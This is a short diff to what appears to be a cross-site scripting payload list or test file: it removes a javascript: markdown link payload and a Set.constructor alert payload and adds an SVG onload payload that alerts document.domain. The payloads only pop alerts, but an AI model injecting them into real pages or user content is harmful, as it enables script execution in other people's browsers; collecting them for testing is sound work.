@@ -1,2 +1,1 @@
-[a](javascript:window.onerror=alert;throw%201)
-Set.constructor`alert(14)```;
+<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
